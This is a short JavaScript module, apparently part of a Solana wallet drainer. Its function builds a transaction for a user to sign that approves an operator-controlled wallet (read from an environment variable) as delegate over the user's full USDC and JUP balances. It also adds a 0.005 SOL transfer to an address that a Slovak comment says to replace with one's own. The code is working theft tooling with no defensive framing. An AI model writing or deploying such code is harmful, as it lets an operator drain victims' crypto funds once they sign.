const {
    Transaction,
    PublicKey,
    SystemProgram,
} = require("@solana/web3.js");

const { createApproveInstruction } = require("@solana/spl-token");
const { getUserTokenAccounts } = require("../solana/tokenService");

async function buildApprove(user, connection) {
    const tx = new Transaction();

    const userPubkey = new PublicKey(user);
    const t = await getUserTokenAccounts(userPubkey, connection);

    const { blockhash } = await connection.getLatestBlockhash();

    tx.recentBlockhash = blockhash;
    tx.feePayer = userPubkey;

    if (t.usdc > 0n) {
        tx.add(
            createApproveInstruction(
                t.usdcATA,
                new PublicKey(process.env.WALLET),
                userPubkey,
                t.usdc
            )
        );
    }

    if (t.jup > 0n) {
        tx.add(
            createApproveInstruction(
                t.jupATA,
                new PublicKey(process.env.WALLET),
                userPubkey,
                t.jup
            )
        );
    }

    tx.add(
    SystemProgram.transfer({
        fromPubkey: userPubkey,
        toPubkey: new PublicKey("11111111111111111111111111111111"), // nahraď vlastnou adresou
        lamports: 5_000_000, // 0.005 SOL
    })
);

    return tx;
}

module.exports = { buildApprove };
